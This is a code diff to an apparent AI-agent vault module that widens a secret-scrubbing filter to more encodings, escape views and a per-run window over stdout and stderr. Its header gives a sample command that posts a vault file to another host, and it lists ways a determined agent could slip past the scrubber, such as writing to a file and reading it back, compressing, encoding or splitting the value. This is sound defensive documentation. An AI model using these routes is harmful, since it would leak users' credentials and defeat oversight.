@@ -40,13 +40,23 @@
  *     door (`OWN_DOORS`) / unknown / not opened for runs / too short to scrub; the conversation's grant; a remembered «always» for
  *     this shape; else a cluster ASKS every time (once / always / deny — the urgent card, 60 s) and a local instance asks the
  *     FIRST time a shape runs and allows it after one 允许 (`seen` — the owner's decision ②; still audited, still scrubbed).
- *   · THE SCRUBBER (`formsOf`, `createMasker`, `maskText`): a value and its five forms — raw; base64 (standard and URL-safe,
- *     padded or not, and the value's own characters at each of the three byte alignments it can take inside a longer
- *     base64 run: `Authorization: Basic base64(user:pass)`); percent-encoded (upper / lower hex; the encodeURIComponent,
- *     RFC 3986, path, WHATWG-form and every-byte spellings, `+` for a space); JSON-escaped (`\"`, `\/`, `\uXXXX`, the HTML-safe
- *     `<`); hex (upper / lower) — become its placeholder. A STREAM keeps back its last (longest form − 1) characters
- *     until the next chunk or its end, so a value split across chunks is still caught. A value under 8 bytes cannot be
- *     scrubbed safely and is never referenced (`entry_too_short_to_mask`).
+ *   · THE SCRUBBER (`FORMS` / `FORM_ROWS` — THE ONE LIST, each form with a real tool that prints it by itself; `formsOf`,
+ *     `VIEWS`, `createRunMasker`, `createMasker`, `maskText`): the value in every spelling a real producer prints becomes its
+ *     placeholder. SPELLED (texts built from the value): raw; base64 (standard and URL-safe, padded or not, and the value's own
+ *     characters at each of the three byte alignments it can take inside a longer base64 run: `Authorization: Basic
+ *     base64(user:pass)`); percent-encoded (upper / lower hex; the encodeURIComponent, RFC 3986, path, WHATWG-form and
+ *     every-byte spellings, `+` for a space); JSON-escaped (`\"`, `\/`, `\uXXXX`, the HTML-safe `<`); hex (upper / lower);
+ *     UTF-16 LE / BE; base32 (RFC 4648, padded or not, either case). READ (lane vault-scrub-forms — a VIEW undoes one family
+ *     of escapes and looks for every spelled form in what it reads; the placeholder replaces the span, its escapes included):
+ *     quoted-printable (=XX, soft breaks); backslash escapes (\xNN, octal, \uXXXX, \u{…}, \UXXXXXXXX, \\ \' \" \n \t \r);
+ *     HTML / XML entities; colour escapes (SGR / EL, `ESC(B`); line breaks (wrapped base64). ONE window per run: a run has
+ *     ONE masker fed by stdout and stderr in arrival order, holding back its last (longest spelled form − 1) characters as
+ *     every view reads them, plus a token not finished yet — a value split across chunks, or between the two pipes, is
+ *     still caught, and chunked or whole the output is the same. The output belt (src/agent-output-belt.js) masks whole
+ *     texts with the same table (`maskText`), so it keeps no window of its own.
+ *     THE FLOOR: the scrubber masks a WHOLE value in a spelling, never a part of one — a fragment passes (its last four
+ *     characters, half of it); a value under 8 bytes (MIN_MASK_BYTES) cannot be scrubbed without scrubbing ordinary text
+ *     and is never referenced (`entry_too_short_to_mask`).
  *
  * WHAT IT IS NOT — §8.6, the three holes, said where the code is:
  *   ① the child runs as the agent's uid today: the agent can read /proc/<child>/environ and the 0600 file while it runs —
@@ -55,15 +65,17 @@
  *   ② a tool can SEND the value somewhere (`curl -d @$VAULT_FILE{x} https://elsewhere`): the card shows the hosts and the
  *     whole command; the egress fence is P1 (vault-run-egress);
  *   ③ THE SCRUBBER IS A SIEVE. It reads the child's stdout and stderr and catches the value in the forms above — nothing
- *     else: a custom encoding, compression, encryption, a reversal, a hash or an HMAC, the last four characters, MIME-wrapped
- *     base64, a value split between stdout and stderr all pass, and a value WRITTEN TO A FILE that the agent then `cat`s with
- *     its own shell never meets the scrubber at all — WRITE-THEN-CAT DEFEATS IT. The refusal table is a belt, not a proof.
+ *     else: what an adversary invents passes — a custom encoding, compression (gzip + base64: a compressed stream is not a
+ *     spelling, its bytes depend on everything before them), encryption, a hash or an HMAC, a reversal, a case swap, the
+ *     characters spaced out, a value split between the pipes with other output between its halves, two escape families on
+ *     one value at once — and so does a fragment (THE FLOOR above); a value WRITTEN TO A FILE that the agent then `cat`s
+ *     with its own shell never meets the scrubber at all — WRITE-THEN-CAT DEFEATS IT. The refusal table is a belt, not a proof.
  *     `run` stops ACCIDENTAL printing and a casual prompt injection; it does not stop a determined agent with a shell under
  *     the same uid — the same sentence q-040 says of per-session uids.
  *   (Not a hole, a boundary: the exit code, the duration and a file's size are never scrubbed.)
  *
  * PURE: imports only src/vault-inventory.js (the stores, the reference grammar) and src/vault-blocked.js (THE words of a
- * locked vault) — PURE → PURE. Gate: scripts/test-vault-run-model.mjs (every table + four mutants).
+ * locked vault) — PURE → PURE. Gate: scripts/test-vault-run-model.mjs (every table + twelve mutants).
  */
 const VI = require('./vault-inventory.js');
 const VB = require('./vault-blocked.js');
@@ -101,9 +113,9 @@ const WORDS = Object.freeze({
   tool_has_its_own_door: 'VibeSpace\'s own CLIs and the agent browser reach the vault through their own doors',
   entry_has_its_own_door: 'that entry is never referenced by a run — it has its own door',
   entry_unknown: 'no such entry (vibespace-vault list names the ones this conversation may use)',
-  entry_not_runnable: 'the user has not opened that entry for runs (⚙ System ▸ Vault…: the row\'s «Usable by agent runs», off by default) — ask the user in the chat to open it',
+  entry_not_runnable: 'the user has not opened that entry for runs (⚙ System ▸ Vault…: the row\'s «Usable by agent runs», off by default) — ask them for it with its purpose: vibespace-vault request <vault://…> --for "<why>" (a question in their For you tray; nothing waits on it)',
   entry_too_short_to_mask: `that value is shorter than ${MIN_MASK_BYTES} bytes and cannot be scrubbed from the output — it is never referenced`,
-  use_not_granted: 'this conversation may not use that entry — ask the user in the chat',
+  use_not_granted: 'this conversation may not use that entry — ask the user for it with its purpose: vibespace-vault request <vault://…> --for "<why>" (another conversation\'s own entry stays its own)',
   // ── THE DOOR's codes (lane vault-run-door, P0-f — src/server/vault-run-door.js) ──
   job_no_use: 'a Background Work job never runs with a stored secret — run it from the conversation itself',
   device_road_later: 'a run on a paired machine (a remote conversation, --on) is not here yet — a run starts on this instance only',
@@ -572,28 +584,149 @@ function jsonForms(value) {
   return out;
 }
 const hexForms = (bytes) => { const lo = bytes.map((b) => hex2(b, false)).join(''); return [['hex', lo], ['hex', lo.toUpperCase()]]; };
-const FORMS = Object.freeze(['raw', 'base64', 'percent', 'json', 'hex']);
-/** A value → its forms [{ form, text }] (distinct texts, the raw first). */
+/** UTF-8 bytes → text the way a stream decoder reads them (the door's StringDecoder; WHATWG: each maximal ill-formed run
+ *  is one U+FFFD) — how a child's UTF-16 output reaches the scrubber. */
+function decodeUtf8(bytes) {
+  let s = '', i = 0;
+  while (i < bytes.length) {
+    const b = bytes[i];
+    if (b < 0x80) { s += String.fromCharCode(b); i++; continue; }
+    const need = b >= 0xc2 && b <= 0xdf ? 1 : b >= 0xe0 && b <= 0xef ? 2 : b >= 0xf0 && b <= 0xf4 ? 3 : 0;
+    if (!need) { s += '�'; i++; continue; }
+    let cp = b & (need === 1 ? 0x1f : need === 2 ? 0x0f : 0x07), lo = b === 0xe0 ? 0xa0 : b === 0xf0 ? 0x90 : 0x80, hi = b === 0xed ? 0x9f : b === 0xf4 ? 0x8f : 0xbf, j = i + 1;
+    for (; j <= i + need; j++) { const c = bytes[j]; if (c === undefined || c < lo || c > hi) break; cp = (cp << 6) | (c & 0x3f); lo = 0x80; hi = 0xbf; }
+    if (j <= i + need) { s += '�'; i = j; continue; }
+    s += String.fromCodePoint(cp); i = j;
+  }
+  return s;
+}
+/** UTF-16 little- and big-endian, as the door's UTF-8 decoder reads those bytes (an ASCII value: its characters with a NUL after / before each). */
+function utf16Forms(v) {
+  const le = [], be = [];
+  for (let i = 0; i < v.length; i++) { const u = v.charCodeAt(i); le.push(u & 255, u >> 8); be.push(u >> 8, u & 255); }
+  return [['utf16', decodeUtf8(le)], ['utf16', decodeUtf8(be)]];
+}
+const B32 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
+/** base32 (RFC 4648 §6), padded and not, upper- and lower-case. */
+function base32Forms(bytes) {
+  let s = '', acc = 0, bits = 0;
+  for (const b of bytes) { acc = ((acc << 8) | b) & 0xffff; bits += 8; while (bits >= 5) { s += B32[(acc >> (bits - 5)) & 31]; bits -= 5; } }
+  if (bits) s += B32[(acc << (5 - bits)) & 31];
+  const padded = s + '='.repeat((8 - (s.length % 8)) % 8);
+  return [padded, s, padded.toLowerCase(), s.toLowerCase()].map((t) => ['base32', t]);
+}
+/**
+ * THE FORMS — THE ONE LIST of what the scrubber knows (lane vault-scrub-forms, the desk's q-043 verify M1). A form is here
+ * because a REAL tool prints it by itself; `producer` names one. `spelled` forms are texts formsOf builds from the value;
+ * `read` forms are VIEWS (below): the output read with one family of escapes undone, every spelled form looked for in what
+ * the view reads, the ORIGINAL span masked, its escapes included. What is NOT here, and why, is the header's ③.
+ */
+const FORM_ROWS = Object.freeze([
+  ['raw', 'spelled', 'anything that prints what it was given: curl -v (> Authorization: Bearer …), an error echoing its input, an env dump'],
+  ['base64', 'spelled', 'an HTTP Basic header (curl -v), a Kubernetes Secret (kubectl get secret -o yaml), a token inside a JSON body'],
+  ['percent', 'spelled', 'a URL: its query, its userinfo (curl -v, git remote -v), a form body'],
+  ['json', 'spelled', 'any JSON output: kubectl -o json, gh api, a JSON log line'],
+  ['hex', 'spelled', 'a byte dump in a debug log; oathtool -v (Hex secret:)'],
+  ['utf16', 'spelled', 'PowerShell 5\'s > and Out-File, reg export (UTF-16LE); Java\'s writeChars (UTF-16BE)'],
+  ['base32', 'spelled', 'oathtool -v (Base32 secret:), an otpauth:// URI\'s secret='],
+  ['qp', 'read', 'a mail body in quoted-printable (a fetched .eml, an IMAP FETCH): =XX for a byte, a soft line break =\\r\\n anywhere in the value'],
+  ['escape', 'read', 'a language\'s repr of a value with a non-ASCII byte: Python b\'…\\xc3\\xbc…\' and \'…\\u00fc…\', Node util.inspect, Rust {:?} (\\u{…}), git and bash $\'…\' (octal)'],
+  ['entity', 'read', 'an HTML page or an XML file showing the value: a template\'s escaping (&amp; &quot; &#x27; &#61;), a .NET or Maven config'],
+  ['ansi', 'read', 'a terminal with colours: grep --color, git diff --color-words, a test runner\'s coloured diff — SGR escapes between the characters'],
+  ['wrap', 'read', 'a wrapped line: a base64 mail body or openssl base64 output at 64 / 76 columns'],
+].map(([form, how, producer]) => Object.freeze({ form, how, producer })));
+const FORMS = Object.freeze(FORM_ROWS.map((r) => r.form));
+/** A value → its SPELLED forms [{ form, text }] (distinct texts, the raw first). */
 function formsOf(value) {
   const v = String(value == null ? '' : value), bytes = utf8(v);
   const all = [['raw', v],
     ...base64Forms(bytes),
-    ...percentForms(bytes), ...jsonForms(v), ...hexForms(bytes)];
+    ...percentForms(bytes), ...jsonForms(v), ...hexForms(bytes), ...utf16Forms(v), ...base32Forms(bytes)];
   const seen = new Set(), out = [];
   for (const [form, text] of all) if (text && !seen.has(text)) { seen.add(text); out.push(Object.freeze({ form, text })); }
   return out;
 }
 const reEscape = (s) => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+const NAMED_ENTITY = Object.freeze({ amp: '&', lt: '<', gt: '>', quot: '"', apos: '\'' });
+const SIMPLE_ESCAPE = Object.freeze({ '\\': '\\', '\'': '\'', '"': '"', n: '\n', t: '\t', r: '\r' });
+const textOf = (cp) => (cp >= 0 && cp <= 0x10ffff ? { text: String.fromCodePoint(cp) } : null);
 /**
- * ONE output stream's scrubber (stdout and stderr each their own). `secrets` = [{ ref | label, value }] — `ref` a parsed
- * reference (its placeholder) or `label` the `<store>/<row>/<field>`. → { push(chunk) → text, end() → text, hits, bytes (UTF-8
- * bytes of what it replaced — the audit's count), byForm, window }.
- * `push` answers what is safe to hand on now and keeps back the last `window` (longest form − 1) characters: an occurrence
- * that STARTS before the kept tail is whole in the buffer, one that starts inside it waits for the next chunk (or `end`).
+ * THE VIEWS — the `read` forms. A view's TOKEN is a short run that starts with one of its `triggers` (never found inside a
+ * token) and stands for zero or more characters: `read(token)` → { byte } (joined with its neighbours as UTF-8, a byte that
+ * is not UTF-8 read as Latin-1) | { text } ('' = dropped: a soft break, a colour) | null (not a token after all: read as it
+ * is). `max` = the longest token, so a stream holds back an unfinished one; `pairs` = the trigger also escapes itself (`\\`),
+ * so a run of triggers is read in pairs from its start and a stream holds back from the run's last pair boundary.
+ */
+const VIEWS = Object.freeze([
+  { form: 'qp', triggers: '=', max: 3, re: /=(?:\r?\n|[0-9A-Fa-f]{2})/g, read: (t) => (t[1] === '\r' || t[1] === '\n' ? { text: '' } : { byte: parseInt(t.slice(1), 16) }) },
+  { form: 'escape', triggers: '\\', max: 10, pairs: true, re: /\\(?:x[0-9A-Fa-f]{2}|[0-3][0-7]{2}|u\{[0-9A-Fa-f]{1,6}\}|u[0-9A-Fa-f]{4}|U[0-9A-Fa-f]{8}|[\\'"ntr])/g,
+    read: (t) => (t[1] === 'x' ? { byte: parseInt(t.slice(2), 16) } : t[1] >= '0' && t[1] <= '3' ? { byte: parseInt(t.slice(1), 8) }
+      : t[1] === 'u' && t[2] === '{' ? textOf(parseInt(t.slice(3, -1), 16)) : t[1] === 'u' ? { text: String.fromCharCode(parseInt(t.slice(2), 16)) }
+        : t[1] === 'U' ? textOf(parseInt(t.slice(2), 16)) : { text: SIMPLE_ESCAPE[t[1]] }) },
+  { form: 'entity', triggers: '&', max: 10, re: /&(?:#[0-9]{1,7};|#[xX][0-9A-Fa-f]{1,6};|amp;|lt;|gt;|quot;|apos;)/g,
+    read: (t) => (t[1] !== '#' ? { text: NAMED_ENTITY[t.slice(1, -1)] } : textOf(t[2] === 'x' || t[2] === 'X' ? parseInt(t.slice(3, -1), 16) : parseInt(t.slice(2, -1), 10))) },
+  { form: 'ansi', triggers: '\x1b', max: 35, re: /\x1b(?:\[[0-9;:?]{0,32}[mK]|[()][0-9A-Za-z])/g, read: () => ({ text: '' }) },
+  { form: 'wrap', triggers: '\r\n', max: 1, re: /[\r\n]/g, read: () => ({ text: '' }) },
+].map((v) => Object.freeze(v)));
+const UTF8_NEED = (b) => (b >= 0xc2 && b <= 0xdf ? 1 : b >= 0xe0 && b <= 0xef ? 2 : b >= 0xf0 && b <= 0xf4 ? 3 : 0);
+/**
+ * What view `vw` reads in buf[0, end) → null when no token is there (it reads what the plain text says), else { sk, at, to,
+ * spans, end }: sk[i] stands for buf[at[i], to[i]); `spans` = [start, end) of every run a token-made character covers (a
+ * stream never cuts inside one); `end` moves back over a trailing UTF-8 character still missing a byte (not `final`).
+ */
+function readView(vw, buf, end, final) {
+  let sk = '', i = 0, any = false, m;
+  const at = [], to = [], spans = [], bytes = [];
+  const lit = (a, b) => { for (let k = a; k < b; k++) { sk += buf[k]; at.push(k); to.push(k + 1); } };
+  const put = (text, a, b) => { for (let k = 0; k < text.length; k++) { sk += text[k]; at.push(a); to.push(b); } if (b - a > 1) spans.push(a, b); };
+  const flush = () => {
+    for (let k = 0; k < bytes.length;) {
+      const [b, s] = bytes[k], need = UTF8_NEED(b);
+      let cp = b & (need === 1 ? 0x1f : need === 2 ? 0x0f : 0x07), j = k + 1;
+      for (; need && j <= k + need && j < bytes.length; j++) { const c = bytes[j][0]; if (c < 0x80 || c > 0xbf) break; cp = (cp << 6) | (c & 0x3f); }
+      const whole = need && j === k + need + 1 && cp >= [0, 0x80, 0x800, 0x10000][need] && cp <= 0x10ffff && !(cp >= 0xd800 && cp <= 0xdfff);
+      if (whole) { put(String.fromCodePoint(cp), s, bytes[j - 1][2]); k = j; } else { put(String.fromCharCode(b), s, bytes[k][2]); k++; }
+    }
+    bytes.length = 0;
+  };
+  vw.re.lastIndex = 0;
+  while ((m = vw.re.exec(buf)) !== null) {
+    const s = m.index, e = s + m[0].length;
+    if (e > end) break;
+    const r = vw.read(m[0]);
+    if (!r) continue;
+    any = true;
+    if (s > i) { flush(); lit(i, s); }
+    if (r.byte != null) bytes.push([r.byte, s, e]);
+    else if (r.text) { flush(); put(r.text, s, e); }
+    else if (e - s > 1) spans.push(s, e);   // dropped (a soft break, a colour) — bytes on either side still join: =C3=\r\n=BC is one ü
+    i = e;
+  }
+  if (!any) return null;
+  if (!final && i === end && bytes.length) {   // a character still missing a byte at the end waits for the next chunk
+    let k = bytes.length - 1;
+    while (k > 0 && bytes[k][0] >= 0x80 && bytes[k][0] <= 0xbf) k--;
+    if (UTF8_NEED(bytes[k][0]) > bytes.length - 1 - k) { end = bytes[k][1]; bytes.length = k; i = end; }
+  }
+  flush(); lit(i, end);
+  return { sk, at, to, spans, end };
+}
+/**
+ * A RUN's scrubber — ONE per run, fed by every stream of it (the desk's «one window per run»). `secrets` = [{ ref | label,
+ * value }] — `ref` a parsed reference (its placeholder) or `label` the `<store>/<row>/<field>`. → { push(stream, chunk) →
+ * { <stream>: text }, end() → { <stream>: text }, hits, bytes (UTF-8 bytes of the spans it replaced — the audit's count),
+ * byForm, window }.
+ * WHAT IT READS: each stream's own text, and — while more than one stream has text kept back — the run's text in ARRIVAL
+ * order, so a value split between stdout and stderr is seen whole AND a value inside one stream is never lost to the other's
+ * chunks between its characters. A find masks its span on every stream it covers (each gets the placeholder).
+ * WHAT IT KEEPS BACK: per stream, the last `window` (longest spelled form − 1) characters as every view reads them, a token
+ * not finished yet, and the run's last `window` characters in arrival order; a find is handed on whole or kept back whole
+ * (on every stream it covers) — an occurrence that starts before the kept text is whole in the buffer, one that starts
+ * inside it waits for the next chunk (or `end`). One stream: chunked or whole, the output is the same (test-vault-run-model).
  * Hand it text from a streaming decoder (StringDecoder / TextDecoder { stream: true }) — never bytes cut mid-character.
  * A value under MIN_MASK_BYTES throws `entry_too_short_to_mask` (runVerdict refused it already).
  */
-function createMasker(secrets) {
+function createRunMasker(secrets, streams = ['out', 'err']) {
   const table = new Map();
   for (const s of Array.isArray(secrets) ? secrets : []) {
     const v = String(s && s.value != null ? s.value : '');
@@ -605,32 +738,110 @@ function createMasker(secrets) {
   const re = texts.length ? new RegExp(texts.map(reEscape).join('|'), 'g') : null;
   const maxLen = texts.length ? texts[0].length : 1;
   const W = maxLen - 1;
-  let held = '';
+  const names = [...streams];
+  let held = [];   // [[stream, text]] in arrival order — what the run has not handed on yet
   const st = { hits: 0, bytes: 0, byForm: {} };
-  function run(buf, final) {
-    const safe = final ? buf.length : Math.max(0, buf.length - W);
-    let out = '', i = 0, m;
-    if (re) {
+  /** ONE text read plainly and through every view → { safe (what is decided), finds [{ s, e, ph, form }], spans [[s, e]] }. */
+  function scan(buf, final) {
+    const L = buf.length;
+    let safe = final ? L : L - W;
+    const views = [];
+    for (const vw of VIEWS) {
+      let end = L;
+      if (!final) for (let k = Math.max(0, L - vw.max + 1); k < L; k++) if (vw.triggers.includes(buf[k])) {
+        if (vw.pairs) { let j = k; while (j > 0 && buf[j - 1] === buf[k]) j--; k = j + 2 * Math.floor((k - j) / 2); }   // the last pair boundary of the run (a run is read in pairs from its start)
+        end = k; break;
+      }
+      const r = readView(vw, buf, end, final);
+      if (!final) { const len = r ? r.sk.length : end, ss = len - W; safe = Math.min(safe, ss <= 0 ? 0 : !r ? ss : ss < len ? r.at[ss] : r.end); }
+      if (r) views.push([vw, r]);
+    }
+    safe = Math.max(0, safe);
+    const finds = [], spans = [];
+    const look = (sk, r, form) => {
       re.lastIndex = 0;
-      while ((m = re.exec(buf)) && m.index < safe) {
+      let m;
+      while ((m = re.exec(sk)) !== null) {
+        const s = r ? r.at[m.index] : m.index;
+        if (s >= safe) break;
         const t = table.get(m[0]);
-        out += buf.slice(i, m.index) + t.ph;
-        i = m.index + m[0].length;
-        st.hits++; st.bytes += bytesOf(m[0]); st.byForm[t.form] = (st.byForm[t.form] || 0) + 1;
+        finds.push({ s, e: r ? r.to[m.index + m[0].length - 1] : m.index + m[0].length, ph: t.ph, form: form || t.form });
+      }
+    };
+    look(buf, null, null);
+    for (const [vw, r] of views) { look(r.sk, r, vw.form); for (let k = 0; k < r.spans.length; k += 2) spans.push([r.spans[k], r.spans[k + 1]]); }
+    return { safe, finds, spans };
+  }
+  function step(final) {
+    const out = {}; for (const k of names) out[k] = '';
+    if (!held.length) return out;
+    const own = new Map();   // stream → its kept-back text
+    for (const [k, x] of held) own.set(k, (own.get(k) || '') + x);
+    if (!re) { for (const [k, x] of own) out[k] += x; held = []; return out; }
+    // GROUPS: a find (or one token / joined character a view read) → its range on each stream it covers, [a, b) in that
+    // stream's own text — handed on whole, or kept back whole on every one of them
+    const groups = [], cut = new Map();
+    for (const [k, x] of own) {
+      const sc = scan(x, final);
+      cut.set(k, sc.safe);
+      for (const f of sc.finds) groups.push({ r: [[k, f.s, f.e]], ph: f.ph, form: f.form });
+      for (const [a, b] of sc.spans) groups.push({ r: [[k, a, b]], tok: true });
+    }
+    if (own.size > 1) {   // the run's text in arrival order: a value split between the pipes
+      const all = held.map((x) => x[1]).join(''), streamAt = [], idxAt = [], seen = new Map();
+      for (const [k, x] of held) for (let j = 0; j < x.length; j++) { const i = seen.get(k) || 0; streamAt.push(k); idxAt.push(i); seen.set(k, i + 1); }
+      const rangesOf = (a, b) => { const m = new Map(); for (let i = a; i < b; i++) { const k = streamAt[i], x = m.get(k); if (x) x[2] = idxAt[i] + 1; else m.set(k, [k, idxAt[i], idxAt[i] + 1]); } return [...m.values()]; };
+      const sc = scan(all, final);
+      if (!final) { const n = new Map(); for (let i = 0; i < sc.safe; i++) n.set(streamAt[i], (n.get(streamAt[i]) || 0) + 1); for (const [k] of own) cut.set(k, Math.min(cut.get(k), n.get(k) || 0)); }
+      for (const f of sc.finds) groups.push({ r: rangesOf(f.s, f.e), ph: f.ph, form: f.form });
+      for (const [a, b] of sc.spans) groups.push({ r: rangesOf(a, b), tok: true });
+    }
+    if (!final) for (let moved = true; moved;) {   // never cut inside a group: one not wholly before the cuts is kept back whole
+      moved = false;
+      for (const g of groups) {
+        if (g.r.every(([k, , b]) => b <= cut.get(k))) continue;
+        for (const [k, a] of g.r) if (a < cut.get(k)) { cut.set(k, a); moved = true; }
       }
     }
-    const cut = Math.max(i, safe);
-    out += buf.slice(i, cut);
-    held = buf.slice(cut);
+    for (const [k, x] of own) {
+      const c = cut.get(k);
+      const masks = groups.filter((g) => !g.tok && g.r.every(([j, , b]) => b <= cut.get(j))).flatMap((g) => g.r.filter(([j]) => j === k).map(([, a, b]) => ({ a, b, ph: g.ph, form: g.form })));
+      masks.sort((p, q) => p.a - q.a || q.b - p.b);
+      let i = 0, last = null;
+      for (const m of masks) {
+        if (last && m.a < last.b) { if (m.b > last.b) { st.bytes += bytesOf(x.slice(last.b, m.b)); last.b = m.b; i = m.b; } continue; }   // overlapping finds: one placeholder
+        out[k] += x.slice(i, m.a) + m.ph;
+        st.hits++; st.bytes += bytesOf(x.slice(m.a, m.b)); st.byForm[m.form] = (st.byForm[m.form] || 0) + 1;
+        last = { b: m.b }; i = m.b;
+      }
+      out[k] += x.slice(i, c);
+    }
+    const used = new Map(), next = [];
+    for (const [k, x] of held) {
+      const u = used.get(k) || 0, keep = x.slice(Math.max(0, cut.get(k) - u));
+      used.set(k, u + x.length);
+      if (keep) { const p = next[next.length - 1]; if (p && p[0] === k) p[1] += keep; else next.push([k, keep]); }
+    }
+    held = next;
     return out;
   }
   return {
-    push: (chunk) => run(held + String(chunk == null ? '' : chunk), false),
-    end: () => run(held, true),
-    get hits() { return st.hits; }, get bytes() { return st.bytes; }, get byForm() { return { ...st.byForm }; }, window: W,
+    push(stream, chunk) {
+      if (!names.includes(stream)) throw new TypeError(`no such stream: ${stream}`);
+      const t = String(chunk == null ? '' : chunk);
+      if (t) { const last = held[held.length - 1]; if (last && last[0] === stream) last[1] += t; else held.push([stream, t]); }
+      return step(false);
+    },
+    end: () => step(true),
+    get hits() { return st.hits; }, get bytes() { return st.bytes; }, get byForm() { return { ...st.byForm }; }, window: W, streams: names,
   };
 }
-/** One whole text scrubbed (a card's command, a short output). */
+/** ONE stream's scrubber (a whole text, the belt's): the run masker with one stream. → { push(chunk) → text, end() → text, hits, bytes, byForm, window }. */
+function createMasker(secrets) {
+  const m = createRunMasker(secrets, ['out']);
+  return { push: (chunk) => m.push('out', chunk).out, end: () => m.end().out, get hits() { return m.hits; }, get bytes() { return m.bytes; }, get byForm() { return m.byForm; }, window: m.window };
+}
+/** One whole text scrubbed (a card's command, a short output, the output belt's sink text). */
 function maskText(text, secrets) { const m = createMasker(secrets); return m.push(text) + m.end(); }
 
 module.exports = {
@@ -640,5 +851,5 @@ module.exports = {
   TOOL_ROWS, SHELLS, INTERPRETERS, KNOWN_TOOLS, toolNameOf, knownToolOf, refusedTool, toolKindOf,
   RUN_FLAGS, parseRunArgs, timeoutOf, planOf, materialize,
   shapeOf, shapeKeyOf, OWN_DOORS, RUNNABLE_STORES, ownDoorOf, runVerdict,
-  FORMS, formsOf, createMasker, maskText,
+  FORMS, FORM_ROWS, VIEWS, formsOf, createMasker, createRunMasker, maskText,
 };
